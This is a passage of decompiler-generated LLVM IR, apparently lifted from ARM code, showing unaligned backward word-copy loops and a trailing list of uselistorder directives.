  %v4_1221c = sub i32 11, %v0_12224
  %v5_1221c = and i32 %v4_1221c, %v0_12224
  %v6_1221c = icmp slt i32 %v5_1221c, 0
  store i1 %v6_1221c, i1* %cpsr_v.global-to-local, align 1
  %v7_1221c = icmp slt i32 %v2_1221c, 0
  store i1 %v7_1221c, i1* %cpsr_n.global-to-local, align 1
  %v5_12220 = icmp slt i32 %v0_12224, 12
  br i1 %v7_12138, label %dec_label_pc_1221c, label %dec_label_pc_12140

dec_label_pc_12140:                               ; preds = %dec_label_pc_12130
  %v8_12138 = icmp eq i32 %v0_12138, 2
  br i1 %v8_12138, label %dec_label_pc_121b0, label %dec_label_pc_12144

dec_label_pc_12144:                               ; preds = %dec_label_pc_12140
  br i1 %v5_12220, label %dec_label_pc_12190, label %dec_label_pc_1214c

dec_label_pc_1214c:                               ; preds = %dec_label_pc_12144
  store i32 %v2_1221c, i32* %r2.global-to-local, align 4
  %v3_12150 = load i32, i32* @r4, align 4
  store i32 %v3_12150, i32* %stack_var_-12, align 4
  %v6_12150 = load i32, i32* @r5, align 4
  %v8_12150 = inttoptr i32 %v6_12150 to i8*
  store i8* %v8_12150, i8** %stack_var_-8, align 4
  %v11_12150 = load i32, i32* @lr, align 4
  br label %dec_label_pc_12154

dec_label_pc_12154:                               ; preds = %dec_label_pc_12154.dec_label_pc_12154_crit_edge, %dec_label_pc_1214c
  %v0_12178 = phi i32 [ %v1_12178, %dec_label_pc_12154.dec_label_pc_12154_crit_edge ], [ %v0_1217831, %dec_label_pc_1214c ]
  %v0_12158 = phi i32 [ %v0_12158.pre, %dec_label_pc_12154.dec_label_pc_12154_crit_edge ], [ %v1_12130, %dec_label_pc_1214c ]
  %v0_12154 = phi i32 [ %v0_12154.pre, %dec_label_pc_12154.dec_label_pc_12154_crit_edge ], [ %v2_12134, %dec_label_pc_1214c ]
  %v3_12154 = mul i32 %v0_12154, 256
  store i32 %v3_12154, i32* %lr.global-to-local, align 4
  %v1_12158 = add i32 %v0_12158, -4
  %v2_12158 = inttoptr i32 %v1_12158 to i32*
  %v3_12158 = load i32, i32* %v2_12158, align 4
  store i32 %v3_12158, i32* %r3.global-to-local, align 4
  %v4_12158 = add i32 %v0_12158, -8
  %v5_12158 = inttoptr i32 %v4_12158 to i32*
  %v6_12158 = load i32, i32* %v5_12158, align 4
  store i32 %v6_12158, i32* %r4.global-to-local, align 4
  %v7_12158 = add i32 %v0_12158, -12
  %v8_12158 = inttoptr i32 %v7_12158 to i32*
  %v9_12158 = load i32, i32* %v8_12158, align 4
  store i32 %v9_12158, i32* %r5.global-to-local, align 4
  %v10_12158 = add i32 %v0_12158, -16
  %v11_12158 = inttoptr i32 %v10_12158 to i32*
  %v12_12158 = load i32, i32* %v11_12158, align 4
  store i32 %v10_12158, i32* %r1.global-to-local, align 4
  %v4_1215c = udiv i32 %v12_12158, 16777216
  %v5_1215c = or i32 %v4_1215c, %v3_12154
  store i32 %v5_1215c, i32* %lr.global-to-local, align 4
  %v3_12160 = mul i32 %v12_12158, 256
  %v4_12164 = udiv i32 %v9_12158, 16777216
  %v5_12164 = or i32 %v3_12160, %v4_12164
  store i32 %v5_12164, i32* @ip, align 4
  %v3_12168 = mul i32 %v9_12158, 256
  %v4_1216c = udiv i32 %v6_12158, 16777216
  %v5_1216c = or i32 %v3_12168, %v4_1216c
  store i32 %v5_1216c, i32* %r5.global-to-local, align 4
  %v3_12170 = mul i32 %v6_12158, 256
  %v4_12174 = udiv i32 %v3_12158, 16777216
  %v5_12174 = or i32 %v3_12170, %v4_12174
  store i32 %v5_12174, i32* %r4.global-to-local, align 4
  %v1_12178 = add i32 %v0_12178, -16
  %v2_12178 = inttoptr i32 %v1_12178 to i32*
  store i32 %v5_12174, i32* %v2_12178, align 4
  %v4_12178 = add i32 %v0_12178, -12
  %v5_12178 = inttoptr i32 %v4_12178 to i32*
  %v6_12178 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_12178, i32* %v5_12178, align 4
  %v7_12178 = add i32 %v0_12178, -8
  %v8_12178 = inttoptr i32 %v7_12178 to i32*
  %v9_12178 = load i32, i32* @ip, align 4
  store i32 %v9_12178, i32* %v8_12178, align 4
  %v10_12178 = add i32 %v0_12178, -4
  %v11_12178 = inttoptr i32 %v10_12178 to i32*
  %v12_12178 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_12178, i32* %v11_12178, align 4
  store i32 %v1_12178, i32* %r0.global-to-local, align 4
  %v0_1217c = load i32, i32* %r2.global-to-local, align 4
  %v2_1217c = add i32 %v0_1217c, -16
  store i32 %v2_1217c, i32* %r2.global-to-local, align 4
  %v6_12180 = icmp slt i32 %v0_1217c, 16
  br i1 %v6_12180, label %dec_label_pc_12184, label %dec_label_pc_12154.dec_label_pc_12154_crit_edge

dec_label_pc_12154.dec_label_pc_12154_crit_edge:  ; preds = %dec_label_pc_12154
  %v0_12154.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_12158.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12154

dec_label_pc_12184:                               ; preds = %dec_label_pc_12154
  %v2_12184 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12184, i32* @r4, align 4
  %v5_12184 = load i8*, i8** %stack_var_-8, align 4
  %v6_12184 = ptrtoint i8* %v5_12184 to i32
  store i32 %v6_12184, i32* @r5, align 4
  store i32 %v11_12150, i32* @lr, align 4
  %v2_12188 = add i32 %v0_1217c, -4
  store i32 %v2_12188, i32* %r2.global-to-local, align 4
  %v4_12188 = add i32 %v0_1217c, 2147483632
  %v5_12188 = and i32 %v2_12188, %v4_12188
  %v6_12188 = icmp slt i32 %v5_12188, 0
  store i1 %v6_12188, i1* %cpsr_v.global-to-local, align 1
  %v7_12188 = icmp slt i32 %v2_12188, 0
  store i1 %v7_12188, i1* %cpsr_n.global-to-local, align 1
  %v5_1218c = icmp slt i32 %v2_1217c, -12
  br i1 %v5_1218c, label %dec_label_pc_121a8, label %dec_label_pc_12190

dec_label_pc_12190:                               ; preds = %dec_label_pc_12184, %dec_label_pc_12144, %dec_label_pc_12190
  %v1_1219c = phi i32 [ %v5_1219c, %dec_label_pc_12190 ], [ %v1_12178, %dec_label_pc_12184 ], [ %v0_1217831, %dec_label_pc_12144 ]
  %v0_12190 = load i32, i32* %r3.global-to-local, align 4
  %v3_12190 = mul i32 %v0_12190, 256
  store i32 %v3_12190, i32* %ip.global-to-local, align 4
  %v0_12194 = load i32, i32* %r1.global-to-local, align 4
  %v1_12194 = add i32 %v0_12194, -4
  %v2_12194 = inttoptr i32 %v1_12194 to i32*
  %v3_12194 = load i32, i32* %v2_12194, align 4
  store i32 %v3_12194, i32* %r3.global-to-local, align 4
  store i32 %v1_12194, i32* %r1.global-to-local, align 4
  %v4_12198 = udiv i32 %v3_12194, 16777216
  %v5_12198 = or i32 %v4_12198, %v3_12190
  store i32 %v5_12198, i32* @ip, align 4
  %v2_1219c = add i32 %v1_1219c, -4
  %v3_1219c = inttoptr i32 %v2_1219c to i32*
  store i32 %v5_12198, i32* %v3_1219c, align 4
  %v4_1219c = load i32, i32* %r0.global-to-local, align 4
  %v5_1219c = add i32 %v4_1219c, -4
  store i32 %v5_1219c, i32* %r0.global-to-local, align 4
  %v0_121a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_121a0 = add i32 %v0_121a0, -4
  store i32 %v2_121a0, i32* %r2.global-to-local, align 4
  %v6_121a4 = icmp slt i32 %v0_121a0, 4
  br i1 %v6_121a4, label %dec_label_pc_121a8.loopexit, label %dec_label_pc_12190

dec_label_pc_121a8.loopexit:                      ; preds = %dec_label_pc_12190
  %v4_121a0 = sub i32 3, %v0_121a0
  %v5_121a0 = and i32 %v4_121a0, %v0_121a0
  %v6_121a0 = icmp slt i32 %v5_121a0, 0
  %v7_121a0 = icmp slt i32 %v2_121a0, 0
  store i1 %v6_121a0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_121a0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_121a8

dec_label_pc_121a8:                               ; preds = %dec_label_pc_121a8.loopexit, %dec_label_pc_12184
  %v2_120ec63 = phi i32 [ %v5_1219c, %dec_label_pc_121a8.loopexit ], [ %v1_12178, %dec_label_pc_12184 ]
  %v0_120dc59 = phi i32 [ %v2_121a0, %dec_label_pc_121a8.loopexit ], [ %v2_12188, %dec_label_pc_12184 ]
  %v0_121a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_121a8 = add i32 %v0_121a8, 3
  store i32 %v1_121a8, i32* @r1, align 4
  br label %bb143

dec_label_pc_121b0:                               ; preds = %dec_label_pc_12140
  br i1 %v5_12220, label %dec_label_pc_121fc, label %dec_label_pc_121b8

dec_label_pc_121b8:                               ; preds = %dec_label_pc_121b0
  store i32 %v2_1221c, i32* %r2.global-to-local, align 4
  %v3_121bc = load i32, i32* @r4, align 4
  store i32 %v3_121bc, i32* %stack_var_-12, align 4
  %v6_121bc = load i32, i32* @r5, align 4
  %v8_121bc = inttoptr i32 %v6_121bc to i8*
  store i8* %v8_121bc, i8** %stack_var_-8, align 4
  %v11_121bc = load i32, i32* @lr, align 4
  br label %dec_label_pc_121c0

dec_label_pc_121c0:                               ; preds = %dec_label_pc_121c0.dec_label_pc_121c0_crit_edge, %dec_label_pc_121b8
  %v0_121e4 = phi i32 [ %v1_121e4, %dec_label_pc_121c0.dec_label_pc_121c0_crit_edge ], [ %v0_1217831, %dec_label_pc_121b8 ]
  %v0_121c4 = phi i32 [ %v0_121c4.pre, %dec_label_pc_121c0.dec_label_pc_121c0_crit_edge ], [ %v1_12130, %dec_label_pc_121b8 ]
  %v0_121c0 = phi i32 [ %v0_121c0.pre, %dec_label_pc_121c0.dec_label_pc_121c0_crit_edge ], [ %v2_12134, %dec_label_pc_121b8 ]
  %v3_121c0 = mul i32 %v0_121c0, 65536
  store i32 %v3_121c0, i32* %lr.global-to-local, align 4
  %v1_121c4 = add i32 %v0_121c4, -4
  %v2_121c4 = inttoptr i32 %v1_121c4 to i32*
  %v3_121c4 = load i32, i32* %v2_121c4, align 4
  store i32 %v3_121c4, i32* %r3.global-to-local, align 4
  %v4_121c4 = add i32 %v0_121c4, -8
  %v5_121c4 = inttoptr i32 %v4_121c4 to i32*
  %v6_121c4 = load i32, i32* %v5_121c4, align 4
  store i32 %v6_121c4, i32* %r4.global-to-local, align 4
  %v7_121c4 = add i32 %v0_121c4, -12
  %v8_121c4 = inttoptr i32 %v7_121c4 to i32*
  %v9_121c4 = load i32, i32* %v8_121c4, align 4
  store i32 %v9_121c4, i32* %r5.global-to-local, align 4
  %v10_121c4 = add i32 %v0_121c4, -16
  %v11_121c4 = inttoptr i32 %v10_121c4 to i32*
  %v12_121c4 = load i32, i32* %v11_121c4, align 4
  store i32 %v10_121c4, i32* %r1.global-to-local, align 4
  %v4_121c8 = udiv i32 %v12_121c4, 65536
  %v5_121c8 = or i32 %v4_121c8, %v3_121c0
  store i32 %v5_121c8, i32* %lr.global-to-local, align 4
  %v3_121cc = mul i32 %v12_121c4, 65536
  %v4_121d0 = udiv i32 %v9_121c4, 65536
  %v5_121d0 = or i32 %v3_121cc, %v4_121d0
  store i32 %v5_121d0, i32* @ip, align 4
  %v3_121d4 = mul i32 %v9_121c4, 65536
  %v4_121d8 = udiv i32 %v6_121c4, 65536
  %v5_121d8 = or i32 %v3_121d4, %v4_121d8
  store i32 %v5_121d8, i32* %r5.global-to-local, align 4
  %v3_121dc = mul i32 %v6_121c4, 65536
  %v4_121e0 = udiv i32 %v3_121c4, 65536
  %v5_121e0 = or i32 %v3_121dc, %v4_121e0
  store i32 %v5_121e0, i32* %r4.global-to-local, align 4
  %v1_121e4 = add i32 %v0_121e4, -16
  %v2_121e4 = inttoptr i32 %v1_121e4 to i32*
  store i32 %v5_121e0, i32* %v2_121e4, align 4
  %v4_121e4 = add i32 %v0_121e4, -12
  %v5_121e4 = inttoptr i32 %v4_121e4 to i32*
  %v6_121e4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_121e4, i32* %v5_121e4, align 4
  %v7_121e4 = add i32 %v0_121e4, -8
  %v8_121e4 = inttoptr i32 %v7_121e4 to i32*
  %v9_121e4 = load i32, i32* @ip, align 4
  store i32 %v9_121e4, i32* %v8_121e4, align 4
  %v10_121e4 = add i32 %v0_121e4, -4
  %v11_121e4 = inttoptr i32 %v10_121e4 to i32*
  %v12_121e4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_121e4, i32* %v11_121e4, align 4
  store i32 %v1_121e4, i32* %r0.global-to-local, align 4
  %v0_121e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_121e8 = add i32 %v0_121e8, -16
  store i32 %v2_121e8, i32* %r2.global-to-local, align 4
  %v6_121ec = icmp slt i32 %v0_121e8, 16
  br i1 %v6_121ec, label %dec_label_pc_121f0, label %dec_label_pc_121c0.dec_label_pc_121c0_crit_edge

dec_label_pc_121c0.dec_label_pc_121c0_crit_edge:  ; preds = %dec_label_pc_121c0
  %v0_121c0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_121c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_121c0

dec_label_pc_121f0:                               ; preds = %dec_label_pc_121c0
  %v2_121f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_121f0, i32* @r4, align 4
  %v5_121f0 = load i8*, i8** %stack_var_-8, align 4
  %v6_121f0 = ptrtoint i8* %v5_121f0 to i32
  store i32 %v6_121f0, i32* @r5, align 4
  store i32 %v11_121bc, i32* @lr, align 4
  %v2_121f4 = add i32 %v0_121e8, -4
  store i32 %v2_121f4, i32* %r2.global-to-local, align 4
  %v4_121f4 = add i32 %v0_121e8, 2147483632
  %v5_121f4 = and i32 %v2_121f4, %v4_121f4
  %v6_121f4 = icmp slt i32 %v5_121f4, 0
  store i1 %v6_121f4, i1* %cpsr_v.global-to-local, align 1
  %v7_121f4 = icmp slt i32 %v2_121f4, 0
  store i1 %v7_121f4, i1* %cpsr_n.global-to-local, align 1
  %v5_121f8 = icmp slt i32 %v2_121e8, -12
  br i1 %v5_121f8, label %dec_label_pc_12214, label %dec_label_pc_121fc

dec_label_pc_121fc:                               ; preds = %dec_label_pc_121f0, %dec_label_pc_121b0, %dec_label_pc_121fc
  %v1_12208 = phi i32 [ %v5_12208, %dec_label_pc_121fc ], [ %v1_121e4, %dec_label_pc_121f0 ], [ %v0_1217831, %dec_label_pc_121b0 ]
  %v0_121fc = load i32, i32* %r3.global-to-local, align 4
  %v3_121fc = mul i32 %v0_121fc, 65536
  store i32 %v3_121fc, i32* %ip.global-to-local, align 4
  %v0_12200 = load i32, i32* %r1.global-to-local, align 4
  %v1_12200 = add i32 %v0_12200, -4
  %v2_12200 = inttoptr i32 %v1_12200 to i32*
  %v3_12200 = load i32, i32* %v2_12200, align 4
  store i32 %v3_12200, i32* %r3.global-to-local, align 4
  store i32 %v1_12200, i32* %r1.global-to-local, align 4
  %v4_12204 = udiv i32 %v3_12200, 65536
  %v5_12204 = or i32 %v4_12204, %v3_121fc
  store i32 %v5_12204, i32* @ip, align 4
  %v2_12208 = add i32 %v1_12208, -4
  %v3_12208 = inttoptr i32 %v2_12208 to i32*
  store i32 %v5_12204, i32* %v3_12208, align 4
  %v4_12208 = load i32, i32* %r0.global-to-local, align 4
  %v5_12208 = add i32 %v4_12208, -4
  store i32 %v5_12208, i32* %r0.global-to-local, align 4
  %v0_1220c = load i32, i32* %r2.global-to-local, align 4
  %v2_1220c = add i32 %v0_1220c, -4
  store i32 %v2_1220c, i32* %r2.global-to-local, align 4
  %v6_12210 = icmp slt i32 %v0_1220c, 4
  br i1 %v6_12210, label %dec_label_pc_12214.loopexit, label %dec_label_pc_121fc

dec_label_pc_12214.loopexit:                      ; preds = %dec_label_pc_121fc
  %v4_1220c = sub i32 3, %v0_1220c
  %v5_1220c = and i32 %v4_1220c, %v0_1220c
  %v6_1220c = icmp slt i32 %v5_1220c, 0
  %v7_1220c = icmp slt i32 %v2_1220c, 0
  store i1 %v6_1220c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1220c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_12214

dec_label_pc_12214:                               ; preds = %dec_label_pc_12214.loopexit, %dec_label_pc_121f0
  %v2_120ec64 = phi i32 [ %v5_12208, %dec_label_pc_12214.loopexit ], [ %v1_121e4, %dec_label_pc_121f0 ]
  %v0_120dc60 = phi i32 [ %v2_1220c, %dec_label_pc_12214.loopexit ], [ %v2_121f4, %dec_label_pc_121f0 ]
  %v0_12214 = load i32, i32* %r1.global-to-local, align 4
  %v1_12214 = add i32 %v0_12214, 2
  store i32 %v1_12214, i32* @r1, align 4
  br label %bb143

dec_label_pc_1221c:                               ; preds = %dec_label_pc_12130
  br i1 %v5_12220, label %dec_label_pc_12268, label %dec_label_pc_12224

dec_label_pc_12224:                               ; preds = %dec_label_pc_1221c
  store i32 %v2_1221c, i32* %r2.global-to-local, align 4
  %v3_12228 = load i32, i32* @r4, align 4
  store i32 %v3_12228, i32* %stack_var_-12, align 4
  %v6_12228 = load i32, i32* @r5, align 4
  %v8_12228 = inttoptr i32 %v6_12228 to i8*
  store i8* %v8_12228, i8** %stack_var_-8, align 4
  %v11_12228 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1222c

dec_label_pc_1222c:                               ; preds = %dec_label_pc_1222c.dec_label_pc_1222c_crit_edge, %dec_label_pc_12224
  %v0_12250 = phi i32 [ %v1_12250, %dec_label_pc_1222c.dec_label_pc_1222c_crit_edge ], [ %v0_1217831, %dec_label_pc_12224 ]
  %v0_12230 = phi i32 [ %v0_12230.pre, %dec_label_pc_1222c.dec_label_pc_1222c_crit_edge ], [ %v1_12130, %dec_label_pc_12224 ]
  %v0_1222c = phi i32 [ %v0_1222c.pre, %dec_label_pc_1222c.dec_label_pc_1222c_crit_edge ], [ %v2_12134, %dec_label_pc_12224 ]
  %v3_1222c = mul i32 %v0_1222c, 16777216
  store i32 %v3_1222c, i32* %lr.global-to-local, align 4
  %v1_12230 = add i32 %v0_12230, -4
  %v2_12230 = inttoptr i32 %v1_12230 to i32*
  %v3_12230 = load i32, i32* %v2_12230, align 4
  store i32 %v3_12230, i32* %r3.global-to-local, align 4
  %v4_12230 = add i32 %v0_12230, -8
  %v5_12230 = inttoptr i32 %v4_12230 to i32*
  %v6_12230 = load i32, i32* %v5_12230, align 4
  store i32 %v6_12230, i32* %r4.global-to-local, align 4
  %v7_12230 = add i32 %v0_12230, -12
  %v8_12230 = inttoptr i32 %v7_12230 to i32*
  %v9_12230 = load i32, i32* %v8_12230, align 4
  store i32 %v9_12230, i32* %r5.global-to-local, align 4
  %v10_12230 = add i32 %v0_12230, -16
  %v11_12230 = inttoptr i32 %v10_12230 to i32*
  %v12_12230 = load i32, i32* %v11_12230, align 4
  store i32 %v10_12230, i32* %r1.global-to-local, align 4
  %v4_12234 = udiv i32 %v12_12230, 256
  %v5_12234 = or i32 %v4_12234, %v3_1222c
  store i32 %v5_12234, i32* %lr.global-to-local, align 4
  %v3_12238 = mul i32 %v12_12230, 16777216
  %v4_1223c = udiv i32 %v9_12230, 256
  %v5_1223c = or i32 %v3_12238, %v4_1223c
  store i32 %v5_1223c, i32* @ip, align 4
  %v3_12240 = mul i32 %v9_12230, 16777216
  %v4_12244 = udiv i32 %v6_12230, 256
  %v5_12244 = or i32 %v3_12240, %v4_12244
  store i32 %v5_12244, i32* %r5.global-to-local, align 4
  %v3_12248 = mul i32 %v6_12230, 16777216
  %v4_1224c = udiv i32 %v3_12230, 256
  %v5_1224c = or i32 %v3_12248, %v4_1224c
  store i32 %v5_1224c, i32* %r4.global-to-local, align 4
  %v1_12250 = add i32 %v0_12250, -16
  %v2_12250 = inttoptr i32 %v1_12250 to i32*
  store i32 %v5_1224c, i32* %v2_12250, align 4
  %v4_12250 = add i32 %v0_12250, -12
  %v5_12250 = inttoptr i32 %v4_12250 to i32*
  %v6_12250 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_12250, i32* %v5_12250, align 4
  %v7_12250 = add i32 %v0_12250, -8
  %v8_12250 = inttoptr i32 %v7_12250 to i32*
  %v9_12250 = load i32, i32* @ip, align 4
  store i32 %v9_12250, i32* %v8_12250, align 4
  %v10_12250 = add i32 %v0_12250, -4
  %v11_12250 = inttoptr i32 %v10_12250 to i32*
  %v12_12250 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_12250, i32* %v11_12250, align 4
  store i32 %v1_12250, i32* %r0.global-to-local, align 4
  %v0_12254 = load i32, i32* %r2.global-to-local, align 4
  %v2_12254 = add i32 %v0_12254, -16
  store i32 %v2_12254, i32* %r2.global-to-local, align 4
  %v6_12258 = icmp slt i32 %v0_12254, 16
  br i1 %v6_12258, label %dec_label_pc_1225c, label %dec_label_pc_1222c.dec_label_pc_1222c_crit_edge

dec_label_pc_1222c.dec_label_pc_1222c_crit_edge:  ; preds = %dec_label_pc_1222c
  %v0_1222c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_12230.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1222c

dec_label_pc_1225c:                               ; preds = %dec_label_pc_1222c
  %v2_1225c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1225c, i32* @r4, align 4
  %v5_1225c = load i8*, i8** %stack_var_-8, align 4
  %v6_1225c = ptrtoint i8* %v5_1225c to i32
  store i32 %v6_1225c, i32* @r5, align 4
  store i32 %v11_12228, i32* @lr, align 4
  %v2_12260 = add i32 %v0_12254, -4
  store i32 %v2_12260, i32* %r2.global-to-local, align 4
  %v4_12260 = add i32 %v0_12254, 2147483632
  %v5_12260 = and i32 %v2_12260, %v4_12260
  %v6_12260 = icmp slt i32 %v5_12260, 0
  store i1 %v6_12260, i1* %cpsr_v.global-to-local, align 1
  %v7_12260 = icmp slt i32 %v2_12260, 0
  store i1 %v7_12260, i1* %cpsr_n.global-to-local, align 1
  %v5_12264 = icmp slt i32 %v2_12254, -12
  br i1 %v5_12264, label %dec_label_pc_12280, label %dec_label_pc_12268

dec_label_pc_12268:                               ; preds = %dec_label_pc_1225c, %dec_label_pc_1221c, %dec_label_pc_12268
  %v1_12274 = phi i32 [ %v5_12274, %dec_label_pc_12268 ], [ %v1_12250, %dec_label_pc_1225c ], [ %v0_1217831, %dec_label_pc_1221c ]
  %v0_12268 = load i32, i32* %r3.global-to-local, align 4
  %v3_12268 = mul i32 %v0_12268, 16777216
  store i32 %v3_12268, i32* %ip.global-to-local, align 4
  %v0_1226c = load i32, i32* %r1.global-to-local, align 4
  %v1_1226c = add i32 %v0_1226c, -4
  %v2_1226c = inttoptr i32 %v1_1226c to i32*
  %v3_1226c = load i32, i32* %v2_1226c, align 4
  store i32 %v3_1226c, i32* %r3.global-to-local, align 4
  store i32 %v1_1226c, i32* %r1.global-to-local, align 4
  %v4_12270 = udiv i32 %v3_1226c, 256
  %v5_12270 = or i32 %v4_12270, %v3_12268
  store i32 %v5_12270, i32* @ip, align 4
  %v2_12274 = add i32 %v1_12274, -4
  %v3_12274 = inttoptr i32 %v2_12274 to i32*
  store i32 %v5_12270, i32* %v3_12274, align 4
  %v4_12274 = load i32, i32* %r0.global-to-local, align 4
  %v5_12274 = add i32 %v4_12274, -4
  store i32 %v5_12274, i32* %r0.global-to-local, align 4
  %v0_12278 = load i32, i32* %r2.global-to-local, align 4
  %v2_12278 = add i32 %v0_12278, -4
  store i32 %v2_12278, i32* %r2.global-to-local, align 4
  %v6_1227c = icmp slt i32 %v0_12278, 4
  br i1 %v6_1227c, label %dec_label_pc_12280.loopexit, label %dec_label_pc_12268

dec_label_pc_12280.loopexit:                      ; preds = %dec_label_pc_12268
  %v4_12278 = sub i32 3, %v0_12278
  %v5_12278 = and i32 %v4_12278, %v0_12278
  %v6_12278 = icmp slt i32 %v5_12278, 0
  %v7_12278 = icmp slt i32 %v2_12278, 0
  store i1 %v6_12278, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_12278, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_12280

dec_label_pc_12280:                               ; preds = %dec_label_pc_12280.loopexit, %dec_label_pc_1225c
  %v2_120ec65 = phi i32 [ %v5_12274, %dec_label_pc_12280.loopexit ], [ %v1_12250, %dec_label_pc_1225c ]
  %v0_120dc61 = phi i32 [ %v2_12278, %dec_label_pc_12280.loopexit ], [ %v2_12260, %dec_label_pc_1225c ]
  %v0_12280 = load i32, i32* %r1.global-to-local, align 4
  %v1_12280 = add i32 %v0_12280, 1
  store i32 %v1_12280, i32* @r1, align 4
  br label %bb143

; uselistorder directives
  uselistorder i32 %v5_12274, { 0, 2, 1 }
  uselistorder i32 %v3_12268, { 1, 0 }
  uselistorder i32 %v2_12260, { 0, 2, 1, 3 }
  uselistorder i32 %v1_12250, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_12230, { 1, 0 }
  uselistorder i32 %v3_1222c, { 1, 0 }
  uselistorder i32 %v0_12230, { 3, 2, 1, 0 }
  uselistorder i32 %v0_12250, { 3, 2, 1, 0 }
  uselistorder i32 %v5_12208, { 0, 2, 1 }
  uselistorder i32 %v3_121fc, { 1, 0 }
  uselistorder i32 %v2_121f4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_121e4, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_121c4, { 1, 0 }
  uselistorder i32 %v3_121c0, { 1, 0 }
  uselistorder i32 %v0_121c4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_121e4, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1219c, { 0, 2, 1 }
  uselistorder i32 %v3_12190, { 1, 0 }
  uselistorder i32 %v2_12188, { 0, 2, 1, 3 }
  uselistorder i32 %v1_12178, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_12158, { 1, 0 }
  uselistorder i32 %v3_12154, { 1, 0 }
  uselistorder i32 %v0_12158, { 3, 2, 1, 0 }
  uselistorder i32 %v0_12178, { 3, 2, 1, 0 }
  uselistorder i1 %v5_12220, { 2, 0, 1 }
  uselistorder i32 %v0_12138, { 1, 0 }
  uselistorder i32 %v0_12224, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1217831, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_12128, { 2, 1, 0 }
  uselistorder i32 %v0_12128, { 2, 0, 1 }
  uselistorder i32 %v2_12120, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_12120, { 1, 0, 2 }
  uselistorder i32 %v0_12120, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1217832, { 2, 1, 0 }
  uselistorder i32 %v11_120fc, { 1, 0 }
  uselistorder i32 %v7_120fc, { 1, 0 }
  uselistorder i32 %v1_120dc, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_120dc, { 1, 2, 0, 3 }
  uselistorder i32 %v2_120e0, { 1, 0 }
  uselistorder i32 %v7_120d4, { 0, 2, 1 }
  uselistorder i32 %v10_120d0, { 1, 0 }
  uselistorder i32 %v9_120c8, { 1, 0, 2 }
  uselistorder i32 %v6_120c4, { 1, 0 }
  uselistorder i32 %v2_120bc, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_120bc, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_120cc, { 0, 3, 2, 1 }
  uselistorder i32 %v7_120b0, { 0, 2, 1 }
  uselistorder i32 %v13_120ac, { 1, 0 }
  uselistorder i32 %v4_120a8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_120a8, { 2, 0, 1 }
  uselistorder i32 %v6_120b0, { 0, 3, 2, 1 }
  uselistorder i32 %v7_120a0, { 0, 2, 1 }
  uselistorder i32 %v16_1209c, { 1, 0 }
  uselistorder i32 %v4_12098, { 1, 0 }
  uselistorder i32 %v0_120a8.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_120a0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1208c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_12088, { 1, 0 }
  uselistorder i32 %v1_12084, { 1, 0 }
  uselistorder i32 %v10_12080, { 1, 0 }
  uselistorder i32 %v0_12080, { 3, 2, 1, 0 }
  uselistorder i32 %v0_12084, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_12078, { 0, 2, 1 }
  uselistorder i32 %v2_1206c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1206c, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_1208449, { 1, 2, 0 }
  uselistorder i32 %v1_12064, { 2, 1, 0 }
  uselistorder i32 %v1_1205c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_12054, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_12050, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_1204c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_1204c, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_12038, { 0, 2, 1 }
  uselistorder i32 %v3_1202c, { 1, 0 }
  uselistorder i32 %v2_12024, { 0, 2, 1, 3 }
  uselistorder i32 %v12_12014, { 1, 0, 3, 2 }
  uselistorder i32 %v8_11ff4, { 1, 0, 2 }
  uselistorder i32 %v5_11ff4, { 1, 0, 2 }
  uselistorder i32 %v2_11ff4, { 1, 0, 2 }
  uselistorder i32 %v3_11ff0, { 1, 0 }
  uselistorder i32 %v0_11ff4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12014, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_11fcc, { 0, 2, 1 }
  uselistorder i32 %v3_11fc0, { 1, 0 }
  uselistorder i32 %v2_11fb8, { 0, 2, 1, 3 }
